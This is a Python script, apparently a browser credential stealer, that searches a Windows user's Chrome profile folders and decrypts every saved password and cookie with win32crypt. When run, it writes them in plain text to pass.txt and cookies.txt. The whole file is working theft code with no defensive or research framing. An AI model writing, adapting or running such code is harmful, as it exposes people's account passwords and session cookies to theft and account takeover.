from os import getenv, path, walk
import sqlite3
import win32crypt
from urllib.parse import urlparse
import json


class Decrypter:
    def __init__(self):
        pass

    def dump_passwords(self, filename, should_print= False):
        path = getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data"
        for path in self.find_files("Login Data"):
            print("Opening: " + path)
            conn = sqlite3.connect(path)
            c = conn.cursor()
            c.execute("SELECT action_url, username_value, password_value FROM logins")
            if filename is not None:
                f = open(filename, "w")
            else:
                f = None
            for o in c.fetchall():
                try:
                    value = win32crypt.CryptUnprotectData(o[2], None, None, None, 0)[1].decode()
                except Exception:
                    value = "<Unknown>"
                parsed_uri = urlparse(o[0])
                domain = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
                s = "Host: %s\nURL: %s\nUsername: %s\nPassword: %s\n-------------------\n" % (domain, o[0], o[1], value)
                if f is not None:
                    f.write(s)
                if should_print:
                    print(s),
            if f is not None:
                f.close()
            if conn is not None:
                conn.close()

    def dump_cookies(self, filename, should_print = False):
        list = []
        for path in self.find_files("Cookies"):
            count = 0
            print("Opening: "+path)
            conn = sqlite3.connect(path)
            c = conn.cursor()
            c.execute("SELECT creation_utc, host_key, name, expires_utc, encrypted_value, value FROM cookies")
            for row in c.fetchall():
                if row[5] == "":
                    try:
                        value = win32crypt.CryptUnprotectData(row[4], None, None, None, 0)[1].decode()
                    except Exception:
                        value = "<Unknown>"
                else:
                    value = row[5]
                # print "C is %d" % count
                item = {"host" : row[1], "creation" : row[0], "expires" : row[3], "name" : row[2], "value" : value}
                list.append(item)
                s = "Host: %s\nCreation: %s\nExpires: %s\nName: %s\nValue: %s\n-------------------\n" % (row[1], row[0], row[3], row[2], value)
                if should_print:
                    print(s),
                count += 1
            if filename is not None:
                f = open(filename, "w")
                f.write(json.dumps(list))
                f.close()
            if conn is not None:
                conn.close()

    def find_files(self, name):
        p = getenv("APPDATA") + r"\..\Local\Google\Chrome\User Data\\"
        paths = []
        for root, dirs, files in walk(p):
            for file in files:
                if file == name:
                    paths.append(path.join(root, file))
        return paths

if __name__ == "__main__":
    d = Decrypter()
    d.dump_passwords("pass.txt")
    d.dump_cookies("cookies.txt")
